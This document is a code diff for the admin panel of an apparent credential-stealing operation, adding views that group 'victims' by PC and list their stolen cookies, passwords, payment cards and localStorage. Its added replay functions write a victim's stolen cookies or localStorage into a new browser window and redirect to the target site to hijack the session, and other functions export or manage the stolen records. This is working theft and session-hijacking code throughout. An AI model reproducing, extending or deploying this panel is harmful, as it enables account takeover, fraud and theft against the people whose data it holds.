-                    <div class="header">
-                        <span class="domain">${domain}</span>
-                        <span class="badge-valuable" style="background:#f59e0b;">🗑️ Trash</span>
+                    <div class="pc-header">
+                        <div class="pc-name">
+                            <span class="icon">🗑️</span>
+                            ${pcName}
+                            <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
+                        </div>
+                        <div class="pc-stats">
+                            <span class="cookies">🍪 ${pc.totalCookies}</span>
+                            <span class="creds">🔐 ${pc.totalCreds}</span>
+                            <span class="cards">💳 ${pc.totalCards}</span>
+                            <span class="storage">💾 ${pc.totalStorage}</span>
+                        </div>
                     </div>
-                    <div class="stats">
-                        <span class="victims" style="color:#f59e0b;">👤 <strong>${stats.entries.length}</strong> victims</span>
+                    <div class="pc-meta">
+                        <span class="flag">${flag}</span>
+                        <span class="ip">${pc.ip}</span>
+                        <span class="country">${pc.country}</span>
+                        <span style="color:#f59e0b;">🗑️ Deleted</span>
                     </div>
-                    <div class="victims-list">${victimsHtml}</div>
-                    <div class="meta">
-                        <span>Deleted: ${stats.entries[0]?.deletedAt ? timeAgo(stats.entries[0].deletedAt) : 'Unknown'}</span>
-                        <span>${stats.entries.length} total</span>
-                    </div>
-                    <div class="actions">
-                        <button class="btn-sm" onclick="event.stopPropagation(); showRestoreAllConfirm('${domain}')" style="border-color:#00ff88;color:#00ff88;">↩️</button>
-                        <button class="btn-sm" onclick="event.stopPropagation(); showPermanentDeleteDomainConfirm('${domain}')" style="border-color:#ff4444;color:#ff4444;">🗑️</button>
+                    <div class="domain-list">${domainsHtml}</div>
+                    <div class="pc-actions">
+                        <button class="btn-sm primary" onclick="showRestorePCConfirm('${pcName}')">↩️ Restore PC</button>
+                        <button class="btn-sm danger" onclick="showPermanentDeletePCConfirm('${pcName}')">🗑️ Permanently Delete</button>
                     </div>
                 `;
-                card.onclick = () => openModal(domain, { entries: stats.entries }, 'trash');
                 grid.appendChild(card);
             });
         }
 
         // ============================================================
-        // CREDENTIALS VIEW
+        // REPLAY FUNCTIONS FOR PC + DOMAIN
         // ============================================================
 
-        function renderCredsView() {
-            const wrap = document.getElementById('credsTableWrap');
-            let allCreds = [];
+        function getEntryForPCDomain(pcName, domain) {
+            for (const entry of allData) {
+                const entryPc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryPc === pcName && entryDomain === domain) {
+                    return entry;
+                }
+            }
+            return null;
+        }
 
-            allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const creds = entry.credentials || [];
-                creds.forEach(c => {
-                    const name = c.name || c.username || c.field || 'unknown';
-                    const value = c.value || c.password || '';
-                    const type = c.type || 'text';
-                    const url = c.url || c.origin_url || domain;
-                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
-                    allCreds.push({
-                        domain: domain,
-                        name: name,
-                        value: value,
-                        type: type,
-                        url: url,
-                        ip: entry.ip,
-                        time: entry.receivedAt,
-                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown',
-                        entryId: entry._uniqueId
-                    });
-                });
-            });
-
-            if (allCreds.length === 0) {
-                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3><p>Send victims to <code>/home.php</code></p></div>`;
+        function replayDomainForPC(pcName, domain) {
+            const entry = getEntryForPCDomain(pcName, domain);
+            if (!entry) {
+                showToast('❌ No data found for this PC + domain', 'error');
                 return;
             }
-
-            let html = `
-                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">🔐 Total: <strong style="color:#ec4899;">${allCreds.length}</strong> credentials</div>
-                <table class="cookies-table">
-                    <thead>
-                        <tr>
-                            <th>Domain</th>
-                            <th>Username</th>
-                            <th>Password</th>
-                            <th>Type</th>
-                            <th>Link</th>
-                            <th>IP</th>
-                            <th>Time</th>
-                            <th style="text-align:center;">Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-            `;
-
-            allCreds.slice(0, 200).forEach((cred, idx) => {
-                const escapedValue = cred.value.replace(/'/g, "\\'");
-                const visKey = 'cred-vis-' + idx;
-                const isVisible = passwordVisibility[visKey] || false;
-                html += `
-                    <tr class="cred-row">
-                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${cred.domain}</td>
-                        <td class="cred-name">${cred.name}</td>
-                        <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
-                        <td><span class="cred-type">${cred.type}</span></td>
-                        <td><a href="https://${cred.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${cred.url.length > 25 ? cred.url.slice(0,25)+'...' : cred.url}</a></td>
-                        <td style="color:#64748b;font-size:10px;">${cred.ip}</td>
-                        <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
-                        <td style="text-align:center;white-space:nowrap;">
-                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'cred-val-${idx}')">👁️</button>
-                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
-                            <button class="btn-icon-sm download" onclick="downloadItem('${cred.name}', '${escapedValue}', 'credential')">⬇️</button>
-                        </td>
-                    </tr>
-                `;
-            });
-
-            if (allCreds.length > 200) {
-                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
+            const cookies = entry.cookies || {};
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found', 'error');
+                return;
             }
+            let actualDomain = domain;
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                showToast('⚠️ Invalid domain for replay', 'error');
+                return;
+            }
+            const win = window.open('', '_blank');
+            if (!win) {
+                showToast('⚠️ Popup blocked. Allow popups.', 'error');
+                return;
+            }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(cookies)};
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replay started for ' + cleanDomain + ' (' + Object.keys(cookies).length + ' cookies)', 'success');
+        }
 
-            html += `</tbody></table>`;
-            wrap.innerHTML = html;
+        function replayStorageDomain(pcName, domain) {
+            const entry = getEntryForPCDomain(pcName, domain);
+            if (!entry) {
+                showToast('❌ No data found for this PC + domain', 'error');
+                return;
+            }
+            const storage = entry.localStorage || {};
+            if (Object.keys(storage).length === 0) {
+                showToast('❌ No LocalStorage found', 'error');
+                return;
+            }
+            let actualDomain = domain;
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                showToast('⚠️ Invalid domain for replay', 'error');
+                return;
+            }
+            const win = window.open('', '_blank');
+            if (!win) {
+                showToast('⚠️ Popup blocked. Allow popups.', 'error');
+                return;
+            }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying LocalStorage for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(storage).length} items</p>
+                <script>
+                    const storage = ${JSON.stringify(storage)};
+                    Object.entries(storage).forEach(([key, value]) => {
+                        try { localStorage.setItem(key, value); } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('💾 Replay started for ' + cleanDomain + ' (' + Object.keys(storage).length + ' items)', 'success');
+        }
+
+        function testDomainFromPC(pcName, domain) {
+            const entry = getEntryForPCDomain(pcName, domain);
+            if (!entry) {
+                showToast('❌ No data found', 'error');
+                return;
+            }
+            const cookies = entry.cookies || {};
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies to test', 'error');
+                return;
+            }
+            let actualDomain = domain;
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                showToast('⚠️ Invalid domain for test', 'error');
+                return;
+            }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            window.open('https://' + cleanDomain, '_blank');
+            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
+        }
+
+        function downloadDomainFromPC(pcName, domain) {
+            const entry = getEntryForPCDomain(pcName, domain);
+            if (!entry) {
+                showToast('❌ No data found', 'error');
+                return;
+            }
+            const cookies = entry.cookies || {};
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies to download', 'error');
+                return;
+            }
+            const data = { pc: pcName, domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${pcName}_${domain}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Downloaded ' + Object.keys(cookies).length + ' cookies', 'success');
+        }
+
+        function openPCModal(pcName, domain) {
+            const entry = getEntryForPCDomain(pcName, domain);
+            if (entry) {
+                openModalForEntry(entry._uniqueId);
+            } else {
+                showToast('❌ No victim found', 'error');
+            }
         }
 
         // ============================================================
-        // CARDS VIEW
+        // PC DELETE FUNCTIONS
         // ============================================================
 
-        function renderCardsView() {
-            const wrap = document.getElementById('cardsTableWrap');
-            let allCards = [];
+        function showDeletePCConfirm(pcName) {
+            showCustomConfirm(
+                'Delete PC',
+                `Delete ALL ${groupByPC(allData)[pcName]?.totalVictims || 0} victims from ${pcName}?`,
+                '🗑️',
+                () => { deletePC(pcName); },
+                true
+            );
+        }
 
-            allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const cards = entry.cards || [];
-                cards.forEach(c => {
-                    let value = c.value || c.number || c.card_number || '';
-                    const name = c.name || c.cardholder || c.holder || 'Unknown';
-                    const type = c.type || 'card-number';
-                    const url = c.url || c.origin_url || domain;
-                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
-                    if (c.month && c.year && !value.includes('/')) {
-                        value = c.month + '/' + c.year;
-                    }
-                    allCards.push({
-                        domain: domain,
-                        name: name,
-                        value: value,
-                        type: type,
-                        url: url,
-                        ip: entry.ip,
-                        time: entry.receivedAt,
-                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown',
-                        entryId: entry._uniqueId
-                    });
-                });
+        async function deletePC(pcName) {
+            const toDelete = allData.filter(e => {
+                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
+                return p === pcName;
             });
-
-            if (allCards.length === 0) {
-                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3><p>Send victims to <code>/home.php</code></p></div>`;
-                return;
+            let deleted = 0;
+            for (const entry of toDelete) {
+                if (entry._uniqueId) {
+                    try {
+                        const res = await fetch(`/api/delete/${entry._uniqueId}`, { method: 'DELETE' });
+                        if (res.status === 401) { window.location.href = '/login'; return; }
+                        const data = await res.json();
+                        if (data.status === 'ok') deleted++;
+                    } catch (e) {}
+                }
             }
+            showToast(`🗑️ Deleted ${deleted} victims from ${pcName}`, 'success');
+            await fetchData();
+            await fetchTrash();
+        }
 
-            let html = `
-                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💳 Total: <strong style="color:#06b6d4;">${allCards.length}</strong> cards</div>
-                <table class="cookies-table">
-                    <thead>
-                        <tr>
-                            <th>Domain</th>
-                            <th>Cardholder</th>
-                            <th>Number / Expiry</th>
-                            <th>Type</th>
-                            <th>Link</th>
-                            <th>IP</th>
-                            <th>Time</th>
-                            <th style="text-align:center;">Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-            `;
+        function showRestorePCConfirm(pcName) {
+            showCustomConfirm(
+                'Restore PC',
+                `Restore ALL victims from ${pcName}?`,
+                '↩️',
+                () => { restorePC(pcName); },
+                false
+            );
+        }
 
-            allCards.slice(0, 200).forEach((card, idx) => {
-                const escapedValue = card.value.replace(/'/g, "\\'");
-                const visKey = 'card-vis-' + idx;
-                const isVisible = passwordVisibility[visKey] || false;
-                const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
-                html += `
-                    <tr class="card-row">
-                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${card.domain}</td>
-                        <td class="card-name">${card.name}</td>
-                        <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
-                        <td><span class="card-type">${card.type}</span></td>
-                        <td><a href="https://${card.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${card.url.length > 25 ? card.url.slice(0,25)+'...' : card.url}</a></td>
-                        <td style="color:#64748b;font-size:10px;">${card.ip}</td>
-                        <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
-                        <td style="text-align:center;white-space:nowrap;">
-                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'card-val-${idx}')">👁️</button>
-                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
-                            <button class="btn-icon-sm download" onclick="downloadItem('${card.name}', '${escapedValue}', 'card')">⬇️</button>
-                        </td>
-                    </tr>
-                `;
+        async function restorePC(pcName) {
+            const toRestore = trashData.filter(e => {
+                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
+                return p === pcName;
             });
-
-            if (allCards.length > 200) {
-                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
+            let restored = 0;
+            for (const entry of toRestore) {
+                if (entry._uniqueId) {
+                    try {
+                        const res = await fetch(`/api/restore/${entry._uniqueId}`, { method: 'POST' });
+                        if (res.status === 401) { window.location.href = '/login'; return; }
+                        const data = await res.json();
+                        if (data.status === 'ok') restored++;
+                    } catch (e) {}
+                }
             }
+            showToast(`↩️ Restored ${restored} victims from ${pcName}`, 'success');
+            await fetchTrash();
+            await fetchData();
+        }
 
-            html += `</tbody></table>`;
-            wrap.innerHTML = html;
+        function showPermanentDeletePCConfirm(pcName) {
+            showCustomConfirm(
+                'Permanently Delete PC',
+                `Permanently delete ALL victims from ${pcName} from trash?`,
+                '⚠️',
+                () => { permanentDeletePC(pcName); },
+                true
+            );
+        }
+
+        async function permanentDeletePC(pcName) {
+            const toDelete = trashData.filter(e => {
+                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
+                return p === pcName;
+            });
+            let deleted = 0;
+            for (const entry of toDelete) {
+                if (entry._uniqueId) {
+                    try {
+                        const res = await fetch(`/api/trash/permanent/${entry._uniqueId}`, { method: 'DELETE' });
+                        if (res.status === 401) { window.location.href = '/login'; return; }
+                        const data = await res.json();
+                        if (data.status === 'ok') deleted++;
+                    } catch (e) {}
+                }
+            }
+            showToast(`🗑️ Permanently deleted ${deleted} victims from ${pcName}`, 'success');
+            await fetchTrash();
+        }
+
+        function downloadPCTxt(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc) { showToast('❌ No data', 'error'); return; }
+            const content = formatTxt(pc.entries, `PC — ${pcName} (${pc.totalVictims} victims)`);
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `pc_${pcName}_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 PC TXT exported', 'success');
+        }
+
+        function downloadPCJson(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc) { showToast('❌ No data', 'error'); return; }
+            const blob = new Blob([JSON.stringify(pc.entries, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `pc_${pcName}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 PC JSON exported', 'success');
         }
 
         // ============================================================
-        // COOKIES VIEW
+        // COOKIES VIEW — PC GROUPED
         // ============================================================
 
         function renderCookiesView() {
             const wrap = document.getElementById('cookiesTableWrap');
+            const grouped = groupByPC(allData);
+            const pcNames = Object.keys(grouped);
 
             let allCookies = [];
-            allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const cookies = entry.cookies || {};
-                Object.entries(cookies).forEach(([name, value]) => {
-                    allCookies.push({
-                        domain: domain,
-                        name: name,
-                        value: value,
-                        valuable: isValuable(name),
-                        entryId: entry._uniqueId
+            pcNames.forEach(pcName => {
+                const pc = grouped[pcName];
+                Object.keys(pc.domains).forEach(domain => {
+                    const d = pc.domains[domain];
+                    d.entries.forEach(entry => {
+                        const cookies = entry.cookies || {};
+                        Object.entries(cookies).forEach(([name, value]) => {
+                            allCookies.push({
+                                pc: pcName,
+                                domain: domain,
+                                name: name,
+                                value: value,
+                                valuable: isValuable(name),
+                                entryId: entry._uniqueId
+                            });
+                        });
                     });
                 });
             });
@@ -2115,6 +2425,7 @@
                 <table class="cookies-table">
                     <thead>
                         <tr>
+                            <th>PC</th>
                             <th>Domain</th>
                             <th>Name</th>
                             <th>Value</th>
@@ -2129,6 +2440,7 @@
                 const escapedValue = cookie.value.replace(/'/g, "\\'");
                 html += `
                     <tr>
+                        <td class="pc-label">${cookie.pc}</td>
                         <td class="cookie-domain" onclick="openModalForEntry('${cookie.entryId}')" style="cursor:pointer;">${cookie.domain}</td>
                         <td class="cookie-name">${cookie.name}</td>
                         <td class="cookie-value" title="${cookie.value}">${cookie.value.length > 40 ? cookie.value.slice(0,40)+'...' : cookie.value}</td>
@@ -2142,67 +2454,497 @@
             });
 
             if (allCookies.length > 150) {
-                html += `<tr><td colspan="5" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCookies.length}</td></tr>`;
+                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCookies.length}</td></tr>`;
             }
-
             html += `</tbody></table>`;
             wrap.innerHTML = html;
         }
 
         // ============================================================
-        // VICTIMS VIEW
+        // CREDENTIALS VIEW — PC GROUPED
+        // ============================================================
+
+        function renderCredsView() {
+            const wrap = document.getElementById('credsTableWrap');
+            let allCreds = [];
+
+            allData.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const creds = entry.credentials || [];
+                creds.forEach(c => {
+                    const name = c.name || c.username || c.field || 'unknown';
+                    const value = c.value || c.password || '';
+                    const type = c.type || 'text';
+                    const url = c.url || c.origin_url || domain;
+                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
+                    allCreds.push({
+                        pc: pc,
+                        domain: domain,
+                        name: name,
+                        value: value,
+                        type: type,
+                        url: url,
+                        ip: entry.ip,
+                        time: entry.receivedAt,
+                        entryId: entry._uniqueId
+                    });
+                });
+            });
+
+            if (allCreds.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">🔐 Total: <strong style="color:#ec4899;">${allCreds.length}</strong> credentials</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>PC</th>
+                            <th>Domain</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Type</th>
+                            <th>Link</th>
+                            <th>Time</th>
+                            <th style="text-align:center;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allCreds.slice(0, 200).forEach((cred, idx) => {
+                const escapedValue = cred.value.replace(/'/g, "\\'");
+                const visKey = 'cred-vis-' + idx;
+                const isVisible = passwordVisibility[visKey] || false;
+                html += `
+                    <tr class="cred-row">
+                        <td class="pc-label">${cred.pc}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${cred.domain}</td>
+                        <td class="cred-name">${cred.name}</td>
+                        <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
+                        <td><span class="cred-type">${cred.type}</span></td>
+                        <td><a href="https://${cred.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${cred.url.length > 25 ? cred.url.slice(0,25)+'...' : cred.url}</a></td>
+                        <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'cred-val-${idx}')">👁️</button>
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${cred.name}', '${escapedValue}', 'credential')">⬇️</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            if (allCreds.length > 200) {
+                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
+            }
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // CARDS VIEW — PC GROUPED
+        // ============================================================
+
+        function renderCardsView() {
+            const wrap = document.getElementById('cardsTableWrap');
+            let allCards = [];
+
+            allData.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cards = entry.cards || [];
+                cards.forEach(c => {
+                    let value = c.value || c.number || c.card_number || '';
+                    const name = c.name || c.cardholder || c.holder || 'Unknown';
+                    const type = c.type || 'card-number';
+                    const url = c.url || c.origin_url || domain;
+                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
+                    if (c.month && c.year && !value.includes('/')) {
+                        value = c.month + '/' + c.year;
+                    }
+                    allCards.push({
+                        pc: pc,
+                        domain: domain,
+                        name: name,
+                        value: value,
+                        type: type,
+                        url: url,
+                        ip: entry.ip,
+                        time: entry.receivedAt,
+                        entryId: entry._uniqueId
+                    });
+                });
+            });
+
+            if (allCards.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💳 Total: <strong style="color:#06b6d4;">${allCards.length}</strong> cards</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>PC</th>
+                            <th>Domain</th>
+                            <th>Cardholder</th>
+                            <th>Number / Expiry</th>
+                            <th>Type</th>
+                            <th>Link</th>
+                            <th>Time</th>
+                            <th style="text-align:center;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allCards.slice(0, 200).forEach((card, idx) => {
+                const escapedValue = card.value.replace(/'/g, "\\'");
+                const visKey = 'card-vis-' + idx;
+                const isVisible = passwordVisibility[visKey] || false;
+                const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
+                html += `
+                    <tr class="card-row">
+                        <td class="pc-label">${card.pc}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${card.domain}</td>
+                        <td class="card-name">${card.name}</td>
+                        <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
+                        <td><span class="card-type">${card.type}</span></td>
+                        <td><a href="https://${card.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${card.url.length > 25 ? card.url.slice(0,25)+'...' : card.url}</a></td>
+                        <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'card-val-${idx}')">👁️</button>
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${card.name}', '${escapedValue}', 'card')">⬇️</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            if (allCards.length > 200) {
+                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
+            }
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // LOCALSTORAGE VIEW — PC GROUPED
+        // ============================================================
+
+        function renderStorageView() {
+            const wrap = document.getElementById('storageTableWrap');
+            let allStorage = [];
+
+            allData.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const storage = entry.localStorage || {};
+                Object.entries(storage).forEach(([key, value]) => {
+                    let browser = 'Unknown';
+                    let cleanKey = key;
+                    if (key.includes(':')) {
+                        const parts = key.split(':');
+                        browser = parts[0];
+                        cleanKey = parts.slice(1).join(':');
+                    }
+                    allStorage.push({
+                        pc: pc,
+                        domain: domain,
+                        key: cleanKey,
+                        value: value,
+                        browser: browser,
+                        ip: entry.ip,
+                        time: entry.receivedAt,
+                        entryId: entry._uniqueId
+                    });
+                });
+            });
+
+            if (allStorage.length === 0) {
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">💾</div><h3>No LocalStorage stolen</h3></div>`;
+                return;
+            }
+
+            let html = `
+                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💾 Total: <strong style="color:#8b5cf6;">${allStorage.length}</strong> LocalStorage items</div>
+                <table class="cookies-table">
+                    <thead>
+                        <tr>
+                            <th>PC</th>
+                            <th>Domain</th>
+                            <th>Browser</th>
+                            <th>Key</th>
+                            <th>Value</th>
+                            <th>Time</th>
+                            <th style="text-align:center;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            allStorage.slice(0, 200).forEach((item, idx) => {
+                const escapedValue = item.value.replace(/'/g, "\\'");
+                const displayValue = item.value.length > 50 ? item.value.slice(0,50)+'...' : item.value;
+                html += `
+                    <tr class="storage-row">
+                        <td class="pc-label">${item.pc}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${item.entryId}')" style="cursor:pointer;">${item.domain}</td>
+                        <td><span class="storage-browser">${item.browser}</span></td>
+                        <td class="storage-key">${item.key}</td>
+                        <td class="storage-value" title="${item.value}">${displayValue}</td>
+                        <td style="color:#475569;font-size:10px;">${timeAgo(item.time)}</td>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${item.key}', '${escapedValue}', 'localstorage')">⬇️</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            if (allStorage.length > 200) {
+                html += `<tr><td colspan="7" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allStorage.length}</td></tr>`;
+            }
+            html += `</tbody></table>`;
+            wrap.innerHTML = html;
+        }
+
+        // ============================================================
+        // VICTIMS VIEW — PC GROUPED
         // ============================================================
 
         function renderVictimsView() {
             const grid = document.getElementById('victimsGrid');
+            const grouped = groupByPC(allData);
+            const pcNames = Object.keys(grouped);
 
-            if (allData.length === 0) {
+            if (pcNames.length === 0) {
                 grid.innerHTML = `<div class="empty-state"><div class="icon">👤</div><h3>No victims yet</h3></div>`;
                 return;
             }
 
             let html = '';
-            allData.slice().reverse().forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const flag = getFlagEmoji(entry.countryCode);
-                const cookieCount = Object.keys(entry.cookies || {}).length;
-                const credCount = (entry.credentials || []).length;
-                const cardCount = (entry.cards || []).length;
-                const time = timeAgo(entry.receivedAt);
-                const fullTime = formatFullTime(entry.receivedAt);
-                let extras = '';
-                if (credCount) extras += `🔐 ${credCount} `;
-                if (cardCount) extras += `💳 ${cardCount} `;
+            pcNames.forEach(pcName => {
+                const pc = grouped[pcName];
+                const flag = getFlagEmoji(pc.countryCode);
+                const hasCookies = pc.totalCookies > 0;
